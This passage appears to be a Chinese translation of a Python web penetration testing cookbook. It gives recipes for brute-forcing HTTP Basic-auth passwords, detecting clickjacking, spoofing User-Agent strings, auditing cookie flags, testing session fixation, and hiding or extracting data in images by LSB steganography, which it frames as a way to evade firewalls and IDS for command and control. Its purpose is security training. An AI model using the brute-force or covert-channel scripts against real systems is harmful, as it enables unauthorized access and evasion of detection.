from requests.auth import HTTPBasicAuth

with open('passwords.txt') as passwords:
    for password in passwords.readlines():
        password = password.strip()
        req = requests.get('http://packtpub.com/admin_login.html', auth=HTTPBasicAuth('admin', password))
        if req.status_code == 401:
            print password, 'failed.'
        elif req.status_code == 200:
            print 'Login successful, password:', password
            break
        else:
            print 'Error occurred with', password
            break
```

## 工作原理...

这个脚本的第一部分逐行读取密码列表，然后发送一个 HTTP `GET`请求到登录页面：

```py
req = requests.get('http://packtpub.com/admin_login.html', auth=HTTPBasicAuth('admin', password))
```

这个请求有一个额外的`auth`参数，其中包含了用户名`admin`和从`passwords.txt`文件中读取的`password`。当发送带有基本`Authorization`头的 HTTP 请求时，原始数据看起来像下面这样：

![工作原理...](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_05_04.jpg)

请注意，在`Authorization`头中，数据以编码格式发送，比如`YWRtaW46cGFzc3dvcmQx`。这是用户名和密码以`base64`编码形式的`username:password`；`requests.auth.HTTPBasicAuth`类只是为我们做了这个转换。这可以通过使用`base64`库来验证，如下面的截图所示：

![工作原理...](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_05_05.jpg)

了解这些信息意味着你仍然可以让脚本在没有外部请求库的情况下运行；相反，它使用`base64`默认库手动创建`Authorization`头。

以下是暴力破解脚本运行的截图：

![工作原理...](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_05_06.jpg)

## 还有更多...

在这个例子中，我们在授权请求中使用了一个固定的用户名 admin，因为这是已知的。如果这是未知的，你可以创建一个`username.txt`文本文件，并循环遍历每一行，就像我们对密码文本文件所做的那样。请注意，这是一个更慢的过程，并且会创建大量的 HTTP 请求到目标站点，这很可能会使你被列入黑名单，除非你实现速率限制。

## 另请参阅

查看第二章中的*检查用户名有效性*和*暴力破解用户名*的示例，以获取有关用户名和密码组合的更多想法。

# 测试点击劫持漏洞

点击劫持是一种用于欺骗用户在不知情的情况下在目标站点上执行操作的技术。这是通过恶意用户在合法网站上放置一个隐藏的覆盖层来实现的，因此当受害者认为他们正在与合法网站进行交互时，实际上他们点击的是隐藏在顶部覆盖层上的隐藏项目。这种攻击可以被设计成使受害者在不知情的情况下输入凭据或点击和拖动项目。这些攻击可以用于针对银行网站，以诱使受害者转账，也常见于社交网络站点，以试图获得更多的关注或点赞，尽管现在大多数站点都有了防御措施。

## 如何做...

网站可以防止点击劫持的两种主要方法：一种是设置`X-FRAME-OPTIONS`头，告诉浏览器如果它在一个框架内就不要渲染该站点，另一种是使用 JavaScript 来跳出框架（通常称为破框）。这个示例将向你展示如何检测这两种防御，以便你可以识别那些没有这两种防御的网站。

```py
import requests
from ghost import Ghost
import logging
import os

URL = 'http://packtpub.com'
req = requests.get(URL)

try:
    xframe = req.headers['x-frame-options']
    print 'X-FRAME-OPTIONS:', xframe , 'present, clickjacking not likely possible'
except:
    print 'X-FRAME-OPTIONS missing'

print 'Attempting clickjacking...'

html = '''
<html>
<body>
<iframe src="img/'''+URL+'''" height='600px' width='800px'></iframe>
</body>
</html>'''

html_filename = 'clickjack.html'
f = open(html_filename, 'w+')
f.write(html)
f.close()

log_filename = 'test.log'
fh = logging.FileHandler(log_filename)
ghost = Ghost(log_level=logging.INFO, log_handler=fh)
page, resources = ghost.open(html_filename)

l = open(log_filename, 'r')
if 'forbidden by X-Frame-Options.' in l.read():
    print 'Clickjacking mitigated via X-FRAME-OPTIONS'
else:
    href = ghost.evaluate('document.location.href')[0]
    if html_filename not in href:
        print 'Frame busting detected'
    else:
        print 'Frame busting not detected, page is likely vulnerable to clickjacking'
l.close()

logging.getLogger('ghost').handlers[0].close()
os.unlink(log_filename)
os.unlink(html_filename)
```

## 工作原理...

这个脚本的第一部分检查了第一个点击劫持防御，即`X-FRAME-OPTIONS`头，方式与前面的示例类似。`X-FRAME-OPTIONS`有三个值：`DENY`、`SAMEORIGIN`或`ALLOW-FROM <url>`。每个值都提供了不同级别的点击劫持保护，因此，在这个示例中，我们尝试检测是否缺少任何一个：

```py
try:
    xframe = req.headers['x-frame-options']
    print 'X-FRAME-OPTIONS:', xframe , 'present, clickjacking not likely possible'
except:
    print 'X-FRAME-OPTIONS missing'
```

代码的下一部分创建了一个本地的 html `clickjack.html`文件，其中包含了一些非常简单的 HTML 代码，并将它们保存到一个本地的`clickjack.html`文件中：

```py
html = '''
<html>
<body>
<iframe src="img/'''+URL+'''" height='600px' width='800px'></iframe>
</body>
</html>'''

html_filename = 'clickjack.html'
f = open(html_filename, 'w+')
f.write(html)
f.close()
```

这段 HTML 代码创建了一个 iframe，其源设置为目标网站。HTML 文件将被加载到 ghost 中，以尝试渲染网站并检测目标站点是否加载在 iframe 中。Ghost 是一个 WebKit 渲染引擎，所以它应该类似于在 Chrome 浏览器中加载站点时会发生的情况。

代码的下一部分设置 ghost 日志记录以重定向到本地日志文件（默认情况下是打印到`stdout`）：

```py
log_filename = 'test.log'
fh = logging.FileHandler(log_filename)
ghost = Ghost(log_level=logging.INFO, log_handler=fh)
```

接下来的一行在 ghost 中呈现本地 HTML 页面，并包含目标页面请求的任何额外资源：

```py
page, resources = ghost.open(html_filename)
```

然后我们打开日志文件并检查`X-FRAME-OPTIONS`错误：

```py
l = open(log_filename, 'r')
if 'forbidden by X-Frame-Options.' in l.read():
    print 'Clickjacking mitigated via X-FRAME-OPTIONS'
```

脚本的下一部分检查了框架破坏；如果 iframe 中有 JavaScript 代码来检测它正在被加载到 iframe 中，它将会跳出框架，导致页面重定向到目标网站。我们可以通过在 ghost 中执行 JavaScript 并读取当前位置来检测这一点：

```py
href = ghost.evaluate('document.location.href')[0]
```

代码的最后部分是清理，关闭任何打开的文件或任何打开的日志处理程序，并删除临时 HTML 和日志文件：

```py
l.close()

logging.getLogger('ghost').handlers[0].close()
os.unlink(log_filename)
os.unlink(html_filename)
```

如果脚本输出`未检测到框架破坏，页面可能容易受到 clickjacking 攻击`，那么目标网站可以在隐藏的 iframe 中呈现，并用于 clickjacking 攻击。下面的截图显示了一个易受攻击网站的日志示例：

![它是如何工作的...](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_05_07.jpg)

如果你在 web 浏览器中查看生成的 clickjack.html 文件，它将确认目标 web 服务器可以在 iframe 中加载，因此容易受到 clickjacking 的攻击，如下面的截图所示：

![它是如何工作的...](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_05_08.jpg)

# 通过欺骗用户代理标识替代站点

一些网站限制访问或根据您用于查看它的浏览器或设备显示不同的内容。例如，一个网站可能会为从 iPhone 浏览的用户显示移动定向主题，或者为使用旧版本且容易受攻击的 Internet Explorer 的用户显示警告。这可能是发现漏洞的好地方，因为这些可能没有经过严格测试，甚至被开发人员遗忘了。

## 如何做...

在这个示例中，我们将向您展示如何欺骗您的用户代理，以便您看起来像是在使用不同的设备，以尝试发现替代内容：

```py
import requests
import hashlib

user_agents = { 'Chrome on Windows 8.1' : 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36',
'Safari on iOS' : 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4',
'IE6 on Windows XP' : 'Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
'Googlebot' : 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' }

responses = {}
for name, agent in user_agents.items():
  headers = {'User-Agent' : agent}
  req = requests.get('http://packtpub.com', headers=headers)
  responses[name] = req

md5s = {}
for name, response in responses.items():
  md5s[name] = hashlib.md5(response.text.encode('utf- 8')).hexdigest()

for name,md5 in md5s.iteritems():
    if name != 'Chrome on Windows 8.1':
        if md5 != md5s['Chrome on Windows 8.1']:
            print name, 'differs from baseline'
        else:
            print 'No alternative site found via User-Agent spoofing:', md5
```

## 它是如何工作的...

我们首先设置了一个用户代理数组，为每个键分配了友好的名称：

```py
user_agents = { 'Chrome on Windows 8.1' : 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36',
'Safari on iOS' : 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4',
'IE6 on Windows XP' : 'Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
'Googlebot' : 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' }
```

这里有四个用户代理：Windows 8.1 上的 Chrome，iOS 上的 Safari，Windows XP 上的 Internet Explorer 6，最后是 Googlebot。这提供了各种浏览器和示例，你会期望在每个请求后面找到不同的内容。列表中的最后一个用户代理，Googlebot，是 Google 在为他们的搜索引擎爬取数据时发送的爬虫。

代码的下一部分循环遍历每个用户代理，并在请求中设置`User-Agent`标头：

```py
responses = {}
for name, agent in user_agents.items():
  headers = {'User-Agent' : agent}
```

接下来的部分发送 HTTP 请求，使用熟悉的 requests 库，并将每个响应存储在响应数组中，使用友好的用户名作为键：

```py
req = requests.get('http://www.google.com', headers=headers)
  responses[name] = req
```

代码的下一部分创建了一个`md5s`数组，然后遍历响应，抓取`response.text`文件。从中生成响应内容的`md5`哈希，并将其存储到`md5s`数组中：

```py
md5s = {}
for name, response in responses.items():
  md5s[name] = hashlib.md5(response.text.encode('utf- 8')).hexdigest()
```

代码的最后部分遍历`md5s`数组，并将每个项目与原始基线请求进行比较，在这个示例中是`Chrome on Windows 8.1`：

```py
for name,md5 in md5s.iteritems():
    if name != 'Chrome on Windows 8.1':
        if md5 != md5s['Chrome on Windows 8.1']:
            print name, 'differs from baseline'
        else:
            print 'No alternative site found via User-Agent spoofing:', md5
```

我们对响应文本进行了哈希处理，以使生成的数组保持较小，从而减少内存占用。你可以通过其内容直接比较每个响应，但这样会更慢，并且会使用更多内存来处理。

如果来自 Web 服务器的响应与 Chrome on Windows 8.1 基线响应不同，脚本将打印出用户代理友好的名称，如下面的截图所示：

![它是如何工作的...](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_05_09.jpg)

## 另请参阅

这个方法是基于能够操纵 HTTP 请求中的标头。查看第三章中的*基于标头的跨站脚本*和*Shellshock 检查*部分，了解更多可以传递到标头中的数据示例。

# 测试不安全的 cookie 标志

HTTP 协议的下一个感兴趣的主题是 cookie。由于 HTTP 是一个无状态协议，cookie 提供了一种在客户端存储持久数据的方式。这允许 Web 服务器通过将数据持久化到 cookie 中来进行会话管理，以便在会话期间保持数据。

Cookies 是通过 HTTP 响应中的`Set-Cookie`头从 Web 服务器设置的。然后它们通过`Cookie`头发送回服务器。这个教程将介绍审核网站设置的 cookie 的方法，以验证它们是否具有安全属性。

## 如何做…

以下是一个枚举目标站点上设置的每个 cookie 并标记任何存在的不安全设置的教程：

```py
import requests

req = requests.get('http://www.packtpub.com')
for cookie in req.cookies:
  print 'Name:', cookie.name
  print 'Value:', cookie.value

  if not cookie.secure:
    cookie.secure = '\x1b[31mFalse\x1b[39;49m'
  print 'Secure:', cookie.secure

  if 'httponly' in cookie._rest.keys():
    cookie.httponly = 'True'
  else:
    cookie.httponly = '\x1b[31mFalse\x1b[39;49m'
  print 'HTTPOnly:', cookie.httponly

  if cookie.domain_initial_dot:
    cookie.domain_initial_dot = '\x1b[31mTrue\x1b[39;49m'
  print 'Loosly defined domain:', cookie.domain_initial_dot, '\n'
```

## 工作原理…

我们枚举从 Web 服务器发送的每个 cookie 并检查它们的属性。前两个属性是 cookie 的`name`和`value`：

```py
  print 'Name:', cookie.name
  print 'Value:', cookie.value
```

然后我们检查 cookie 的`secure`标志：

```py
if not cookie.secure:
    cookie.secure = '\x1b[31mFalse\x1b[39;49m'
  print 'Secure:', cookie.secure
```

`Secure`标志表示 cookie 只能通过 HTTPS 发送。对于用于身份验证的 cookie 来说，这是很好的，因为这意味着如果有人监视开放网络流量，它们无法被窃听。

还要注意`\x1b[31m`代码是一种特殊的 ANSI 转义代码，用于更改终端字体的颜色。在这里，我们用红色突出显示了不安全的标头。`\x1b[39;49m`代码将颜色重置为默认值。请参阅维基百科关于 ANSI 的更多信息[`en.wikipedia.org/wiki/ANSI_escape_code`](http://en.wikipedia.org/wiki/ANSI_escape_code)。

下一个检查是`httponly`属性：

```py
  if 'httponly' in cookie._rest.keys():
    cookie.httponly = 'True'
  else:
    cookie.httponly = '\x1b31mFalse\x1b[39;49m'
  print 'HTTPOnly:', cookie.httponly
```

如果设置为`True`，这意味着 JavaScript 无法访问 cookie 的内容，它被发送到浏览器，只能被浏览器读取。这用于防止 XSS 攻击，因此在渗透测试时，缺少此 cookie 属性是一件好事。

最后，我们检查 cookie 中的域，看它是否以点开头：

```py
if cookie.domain_initial_dot:
    cookie.domain_initial_dot = '\x1b[31mTrue\x1b[39;49m'
  print 'Loosly defined domain:', cookie.domain_initial_dot, '\n'
```

如果 cookie 的`domain`属性以点开头，表示 cookie 用于所有子域，因此可能在预期范围之外可见。

以下截图显示了目标网站中不安全标志以红色突出显示：

![工作原理…

## 还有更多…

我们之前已经看到如何通过提取标头来枚举用于提供网站的技术。某些框架还在 cookie 中存储信息，例如，PHP 创建一个名为**PHPSESSION**的 cookie，用于存储会话数据。因此，这些数据的存在表明使用了 PHP，然后可以进一步枚举服务器以尝试测试其是否存在已知的 PHP 漏洞。

# 通过 cookie 注入进行会话固定

会话固定是一种依赖于会话 ID 的漏洞。首先，攻击者必须能够强制受害者使用特定的会话 ID，方法是在其客户端上设置一个 cookie 或已经知道受害者会话 ID 的值。然后，当受害者进行身份验证时，cookie 在客户端保持不变。因此，攻击者知道会话 ID，现在可以访问受害者的会话。

## 准备工作

这个教程将需要对目标站点执行一些初始的侦察，以确定它是如何进行身份验证的，例如通过`POST`请求中的数据或通过基本的`auth`。它还将需要一个有效的用户帐户进行身份验证。

## 如何做…

这个教程将测试通过 cookie 注入进行会话固定：

```py
import requests

url = 'http://www.packtpub.com/'
req = requests.get(url)
if req.cookies:
  print 'Initial cookie state:', req.cookies
  cookie_req = requests.post(url, cookies=req.cookies, auth=('user1', 'supersecretpasswordhere'))
  print 'Authenticated cookie state:', cookie_req.cookies

  if req.cookies == cookie_req.cookies:
      print 'Session fixation vulnerability identified'
```

## 工作原理…

这个脚本有两个阶段；第一步是向目标网站发送初始的`get`请求，然后显示接收到的 cookie：

```py
req = requests.get(url)
print 'Initial cookie state:', req.cookies
```

脚本的第二阶段向目标站点发送另一个请求，这次使用有效的用户凭据进行身份验证：

```py
cookie_req = requests.post(url, cookies=req.cookies, auth=('user1', 'supersecretpasswordhere'))
```

请注意，这里我们将请求 cookie 设置为之前在初始`GET`请求中收到的 cookie。

脚本最后通过打印最终的 cookie 状态并在经过身份验证的 cookie 与初始请求中发送的 cookie 匹配时打印警告来结束：

```py
print 'Authenticated cookie state:', cookie_req.cookies

if req.cookies == cookie_req.cookies:
  print 'Session fixation vulnerability identified'
```

## 还有更多...

Cookie 是另一个由用户控制并由 Web 服务器解析的数据源。与标头类似，这使得它成为测试 XSS 漏洞的绝佳位置。尝试向 cookie 数据添加 XSS 负载并将其发送到目标服务器，以查看它如何处理数据。请记住，cookie 可能会从 Web 服务器后端读取，也可能会被打印到日志中，因此可能会针对日志读取器进行 XSS 攻击（例如，如果后来由管理员读取）。


# 第六章：图像分析和操作

在本章中，我们将涵盖以下配方：

+   使用 LSB 隐写术隐藏消息

+   提取隐藏在 LSB 中的消息

+   在图像中隐藏文本

+   从图像中提取文本

+   通过使用隐写术进行命令和控制

# 介绍

隐写术是将数据隐藏在明文中的艺术。如果您想掩盖自己的踪迹，这可能会很有用。我们可以使用隐写术来规避防火墙和 IDS 的检测。在本章中，我们将看一些 Python 如何帮助我们在图像中隐藏数据的方法。我们将通过使用**最低有效位**（**LSB**）来隐藏我们的数据，然后我们将创建一个自定义的隐写术函数。本章的最终目标将是创建一个命令和控制系统，该系统使用我们特制的图像在服务器和客户端之间传输数据。

以下图片是一个在其中隐藏了另一张图片的示例。您可以看到（或者也许看不到）人眼无法检测到任何东西：

![介绍](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_06_01.jpg)

# 使用 LSB 隐写术隐藏消息

在这个配方中，我们将使用 LSB 隐写术方法创建一个隐藏另一个图像的图像。这是隐写术的最常见形式之一。由于仅仅有一种隐藏数据的方法是不够的，我们还将编写一个脚本来提取隐藏的数据。

## 准备工作

本章中遇到的所有图像工作都将使用**Python 图像库**（**PIL**）。要在 Linux 上使用`PIP`安装 Python 图像库，请使用以下命令：

```py
$ pip install PIL

```

如果您正在 Windows 上安装它，您可能需要使用[`www.pythonware.com/products/pil/`](http://www.pythonware.com/products/pil/)上可用的安装程序。

只需确保为您的 Python 版本获取正确的安装程序。

值得注意的是，PIL 已被更新为更新版本的 PILLOW。但对于我们的需求，PIL 就足够了。

## 如何做…

图像由像素组成，每个像素由红色、绿色和蓝色（RGB）值组成（对于彩色图像）。这些值的范围是从 0 到 255，之所以如此是因为每个值都是 8 位长。纯黑色像素将由元组（R（0），G（0），B（0））表示，纯白色像素将由（R（255），G（255），B（255））表示。我们将专注于第一个配方中`R`值的二进制表示。我们将获取 8 位值并改变最右边的位。我们之所以能够这样做是因为对这一位的更改将导致像素的红色值变化少于 0.4％。这远低于人眼可以检测到的范围。

让我们现在看一下脚本，然后我们稍后将介绍它是如何工作的：

```py
  #!/usr/bin/env python

from PIL import Image

def Hide_message(carrier, message, outfile):
    c_image = Image.open(carrier)
    hide = Image.open(message)
    hide = hide.resize(c_image.size)
    hide = hide.convert('1')
    out = Image.new('RGB', c_image.size)

    width, height = c_image.size

    new_array = []

    for h in range(height):
        for w in range(width):
            ip = c_image.getpixel((w,h))
            hp = hide.getpixel((w,h))
            if hp == 0: 
                newred = ip[0] & 254
            else: 
                newred = ip[0] | 1

            new_array.append((newred, ip[1], ip[2]))

    out.putdata(new_array)
    out.save(outfile)
    print "Steg image saved to " + outfile

Hide_message('carrier.png', 'message.png', 'outfile.png')
```

## 它是如何工作的…

首先，我们从 PIL 中导入`Image`模块：

```py
from PIL import Image
```

然后，我们创建我们的`Hide_message`函数：

```py
def Hide_message(carrier, message, outfile):
```

此函数接受三个参数，如下所示：

+   `carrier`：这是我们用来隐藏另一张图片的图片的文件名

+   `message`：这是我们要隐藏的图片的文件名

+   `outfile`：这是我们的函数生成的新文件的名称

接下来，我们打开载体和消息图像：

```py
c_image = Image.open(carrier)
hide = Image.open(message)
```

然后，我们操纵要隐藏的图像，使其与我们的载体图像具有相同的大小（宽度和高度）。我们还将要隐藏的图像转换为纯黑白。这是通过将图像的模式设置为`1`来完成的：

```py
hide = hide.resize(c_image.size)
hide = hide.convert('1')
```

接下来，我们创建一个新图像，并将图像模式设置为 RGB，大小设置为载体图像的大小。我们创建两个变量来保存载体图像的宽度和高度的值，并设置一个数组；这个数组将保存我们最终保存到新图像中的新像素值，如下所示：

```py
out = Image.new('RGB', c_image.size)

width, height = c_image.size

new_array = []
```

接下来是我们函数的主要部分。我们需要获取我们想要隐藏的像素的值。如果它是黑色像素，那么我们将设置载体的红色像素的 LSB 为`0`，如果是白色，则需要设置为`1`。我们可以通过使用位操作来轻松实现这一点。如果我们想将 LSB 设置为`0`，我们可以使用`AND`值与`254`，或者如果我们想将值设置为`1`，我们可以使用`OR`值与`1`。

我们循环遍历图像中的所有像素，一旦我们有了`newred`值，我们将这些值与原始绿色和蓝色值一起附加到我们的`new_array`中：

```py
    for h in range(height):
        for w in range(width):
            ip = c_image.getpixel((w,h))
            hp = hide.getpixel((w,h))
            if hp == 0: 
                newred = ip[0] & 254
            else: 
                newred = ip[0] | 1

            new_array.append((newred, ip[1], ip[2]))

    out.putdata(new_array)
    out.save(outfile)
    print "Steg image saved to " + outfile
```

在函数的最后，我们使用`putdata`方法将新像素值数组添加到新图像中，然后使用`outfile`指定的文件名保存文件。

应该注意的是，您必须将图像保存为 PNG 文件。这是一个重要的步骤，因为 PNG 是一种无损算法。例如，如果您将图像保存为 JPEG，LSB 值将不会保持不变，因为 JPEG 使用的压缩算法会改变我们指定的值。

## 还有更多…

在这个方法中，我们使用了红色值的 LSB 来隐藏我们的图像；然而，您可以使用 RGB 值中的任何一个，甚至全部三个。一些隐写术的方法会将 8 位分割到多个像素中，以便每个位都会分割到 RGBRGBRG 等中。自然地，如果您想使用这种方法，您的载体图像将需要比您想要隐藏的消息大得多。

## 另请参阅

因此，我们现在有了一种隐藏我们的图像的方法。在下一个方法中，我们将看看如何提取该消息。

# 提取隐藏在 LSB 中的消息

这个方法将允许我们通过使用前面方法中的 LSB 技术从图像中提取隐藏的消息。

## 如何做…

如前面的方法所示，我们使用 RGB 像素的`Red`值的 LSB 来隐藏我们想要隐藏的图像中的黑色或白色像素。这个方法将颠倒这个过程，从载体图像中提取隐藏的黑白图像。让我们来看看将执行此操作的函数：

```py
#!/usr/bin/env python

from PIL import Image

def ExtractMessage(carrier, outfile):
    c_image = Image.open(carrier)
    out = Image.new('L', c_image.size)
    width, height = c_image.size
    new_array = []

    for h in range(height):
        for w in range(width):
            ip = c_image.getpixel((w,h))
            if ip[0] & 1 == 0:
                new_array.append(0)
            else:
                new_array.append(255)

    out.putdata(new_array)
    out.save(outfile)
    print "Message extracted and saved to " + outfile

ExtractMessage('StegTest.png', 'extracted.png')
```

## 工作原理…

首先，我们从 Python 图像库中导入`Image`模块：

```py
from PIL import Image
```

接下来，我们设置将用于提取消息的函数。该函数接受两个参数：`carrier`图像文件名和我们想要用提取的图像创建的文件名：

```py
def ExtractMessage(carrier, outfile):
```

接下来，我们从`carrier`图像创建一个`Image`对象。我们还为提取的数据创建一个新图像；该图像的模式设置为`L`，因为我们正在创建一个灰度图像。我们创建两个变量来保存载体图像的宽度和高度。最后，我们设置一个数组来保存我们提取的数据值：

```py
c_image = Image.open(carrier)
out = Image.new('L', c_image.size)

width, height = c_image.size

new_array = []
```

现在，进入函数的主要部分：提取。我们创建`for`循环来迭代载体的像素。我们使用`Image`对象和`getpixel`函数来返回像素的 RGB 值。为了从像素的红色值中提取 LSB，我们使用位掩码。如果我们使用一个位`AND`与红色值，使用一个掩码`1`，如果 LSB 是`0`，我们将得到一个`0`，如果是`1`，我们将得到一个`1`。因此，我们可以将其放入一个`if`语句中来创建我们新数组的值。由于我们正在创建一个灰度图像，像素值的范围是`0`到`255`，所以，如果我们知道 LSB 是`1`，我们将其转换为`255`。基本上就是这样。剩下的就是使用我们新图像的`putdata`方法来从数组创建图像，然后保存。

## 还有更多…

到目前为止，我们已经看过了在另一张图像中隐藏一张图像的方法，但还有许多其他隐藏不同数据在其他载体中的方法。有了这个提取函数和之前用于隐藏图像的方法，我们离能够通过消息发送和接收命令的东西更近了，但我们需要找到一个更好的方法来发送实际的命令。下一个方法将专注于在图像中隐藏实际文本。

# 在图像中隐藏文本

在之前的配方中，我们已经研究了如何在另一个图像中隐藏图像。这都很好，但是我们本章的主要目标是传递我们可以在命令和控制样式格式中使用的文本。这个配方的目的是在图像中隐藏一些文本。

## 如何操作...

到目前为止，我们已经专注于像素的 RGB 值。在 PNG 中，我们可以访问另一个值，即`A`值。`RGBA`的`A`值是该像素的透明度级别。在这个配方中，我们将使用这种模式，因为它将允许我们在每个值的 LSB 中存储 8 位。这意味着我们可以在两个像素中隐藏一个单个`char`值，因此我们需要一个像素计数至少是我们要隐藏的字符数量的两倍的图像。

让我们看一下脚本：

```py
from PIL import Image

def Set_LSB(value, bit):
    if bit == '0':
        value = value & 254
    else:
        value = value | 1
    return value

def Hide_message(carrier, message, outfile):
    message += chr(0)
    c_image = Image.open(carrier)
    c_image = c_image.convert('RGBA')

    out = Image.new(c_image.mode, c_image.size)
    pixel_list = list(c_image.getdata())
    new_array = []

    for i in range(len(message)):
        char_int = ord(message[i])
        cb = str(bin(char_int))[2:].zfill(8)
        pix1 = pixel_list[i*2]
        pix2 = pixel_list[(i*2)+1]
        newpix1 = []
        newpix2 = []

        for j in range(0,4):
            newpix1.append(Set_LSB(pix1[j], cb[j]))
            newpix2.append(Set_LSB(pix2[j], cb[j+4]))

        new_array.append(tuple(newpix1))
        new_array.append(tuple(newpix2))

    new_array.extend(pixel_list[len(message)*2:])

    out.putdata(new_array)
    out.save(outfile)
    print "Steg image saved to " + outfile

Hide_message('c:\\python27\\FunnyCatPewPew.png', 'The quick brown fox jumps over the lazy dogs back.', 'messagehidden.png')
```

## 它是如何工作的...

首先，我们从`PIL`中导入`Image`模块：

```py
from PIL import Image
```

接下来，我们设置一个辅助函数，它将帮助根据要隐藏的二进制设置传入值的 LSB：

```py
def Set_LSB(value, bit):
    if bit == '0':
        value = value & 254
    else:
        value = value | 1
    return value
```

我们正在使用一个位掩码来设置 LSB，根据我们传入的二进制值是`1`还是`0`。如果是`0`，我们使用掩码`254`（11111110）进行按位`AND`，如果是`1`，我们使用掩码`1`（00000001）进行按位`OR`。函数返回结果值。

接下来，我们创建我们的主要`Hide_message`方法，它接受三个参数：我们的载体图像的文件名，我们想要隐藏的消息的字符串，最后是我们将创建的输出图像的文件名：

```py
def Hide_message(carrier, message, outfile):
```

下一行代码将值`0x00`添加到字符串的末尾。这在提取函数中将很重要，因为它将告诉我们已经到达了隐藏文本的末尾。我们使用`chr()`函数将`0x00`转换为友好的字符串表示：

```py
message += chr(0)
```

代码的下一部分创建了两个图像对象：一个是我们的载体，另一个是输出图像。对于我们的载体图像，我们将模式更改为`RGBA`，以确保每个像素有四个值。然后我们创建了一些数组：`pixel_list`是来自我们载体图像的所有像素数据，`new_array`将保存我们合并的`carrier`和`message`图像的所有新像素值：

```py
c_image = Image.open(carrier) 
c_image = c_image.convert('RGBA')
out = Image.new(c_image.mode, c_image.size)

pixel_list = list(c_image.getdata())
new_array = []
```

接下来，我们在`for`循环中循环遍历消息中的每个字符：

```py
for i in range(len(message)):
```

我们首先将字符转换为`int`：

```py
char_int = ord(message[i])
```

然后我们将该`int`转换为二进制字符串，我们使用`zfill`函数确保它有 8 个字符长。这将使以后更容易。当你使用`bin()`时，它会在字符串前面加上 0 位，所以`[2:]`只是去掉了它：

```py
cb = str(bin(char_int))[2:].zfill(8)
```

接下来，我们创建两个像素变量并填充它们。我们使用当前消息字符索引的`*2`作为第一个像素，使用（当前消息字符索引的`*2`）和`1`作为第二个像素。这是因为我们每个字符使用两个像素：

```py
pix1 = pixel_list[i*2]
pix2 = pixel_list[(i*2)+1]
```

接下来，我们创建两个将保存隐藏数据值的数组：

```py
newpix1 = []
newpix2 = []
```

现在一切都设置好了，我们可以开始改变像素数据的值，我们迭代 4 次（对于 RGBA 值），并调用我们的辅助方法来设置 LSB。`newpix1`函数将包含我们 8 位字符的前 4 位；`newpix2`将包含最后 4 位：

```py
for j in range(0,4):
            newpix1.append(Set_LSB(pix1[j], cb[j]))
            newpix2.append(Set_LSB(pix2[j], cb[j+4]))
```

一旦我们有了新的值，我们将把它们转换为元组并附加到`new_array`中：

```py
new_array.append(tuple(newpix1))
new_array.append(tuple(newpix2))
```

以下是描述我们将实现的图像：

![它是如何工作的...](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_06_02.jpg)

剩下要做的就是用载体图像中剩余的像素扩展`new_array`方法，然后使用传递给我们的`Hide_message`函数的`filename`参数保存它：

```py
new_array.extend(pixel_list[len(message)*2:])

out.putdata(new_array)
out.save(outfile)
print "Steg image saved to " + outfile
```

## 还有更多...

正如在本配方开始时所述，我们需要确保载体图像的像素计数是我们要隐藏的消息的两倍大小。我们可以添加一个检查，如下所示：

```py
if len(message) * 2 < len(list(image.getdata())):
  #Throw an error and advise the user
```

对于这个配方来说，基本上就是这样；我们现在可以在图像中隐藏文本，而且还可以使用之前的配方隐藏图像。在下一个配方中，我们将提取文本数据。

# 从图像中提取文本

在上一个配方中，我们看到了如何隐藏文本在图像的`RGBA`值中。这个配方将让我们提取这些数据。

## 如何做…

我们在上一个配方中看到，我们将字符的字节分成 8 位，并将它们分布在两个像素的 LSB 上。这里是那个图表，作为提醒：

![如何做…](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_06_03.jpg)

以下是将执行提取的脚本：

```py
from PIL import Image
from itertools import izip

def get_pixel_pairs(iterable):
    a = iter(iterable)
    return izip(a, a)

def get_LSB(value):
    if value & 1 == 0:
        return '0'
    else:
        return '1'

def extract_message(carrier):
    c_image = Image.open(carrier)
    pixel_list = list(c_image.getdata())
    message = ""

    for pix1, pix2 in get_pixel_pairs(pixel_list):
        message_byte = "0b"
        for p in pix1:
            message_byte += get_LSB(p)

        for p in pix2:
            message_byte += get_LSB(p)

        if message_byte == "0b00000000":
            break

        message += chr(int(message_byte,2))
    return message

print extract_message('messagehidden.png')
```

## 它是如何工作的…

首先，我们从`PIL`导入`Image`模块；我们还从`itertools`导入`izip`模块。`izip`模块将用于返回像素对：

```py
from PIL import Image
from itertools import izip
```

接下来，我们创建两个辅助函数。`get_pixel_pairs`函数接受我们的像素列表并返回对；由于每个消息字符分布在两个像素上，这使得提取更容易。另一个辅助函数`get_LSB`将接受`R`、`G`、`B`或`A`值，并使用位掩码获取 LSB 值，并以字符串格式返回它：

```py
def get_pixel_pairs(iterable):
    a = iter(iterable)
    return izip(a, a)

def get_LSB(value):
    if value & 1 == 0:
        return '0'
    else:
